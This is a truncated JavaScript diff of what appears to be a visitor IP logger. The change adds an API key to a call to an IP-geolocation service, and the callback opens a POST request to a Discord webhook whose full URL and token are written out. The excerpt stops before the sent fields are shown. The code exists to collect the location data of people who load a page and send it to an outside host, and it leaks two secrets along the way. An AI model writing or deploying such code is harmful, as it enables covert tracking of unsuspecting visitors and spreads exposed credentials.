@@ -1,4 +1,4 @@
-$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
+$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=e353b09b1df448bb9c19bf161e350ce8", function(data) { //Make sure to use this api or use another but you got to change the values down below
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1273697916195831899/gdSaQntL1ouDWdMzcXB_lLsRjZ777H4o0psGkXqHg7aYnz6Dw6AOSG4hHmr_BZFZeI1y");
   
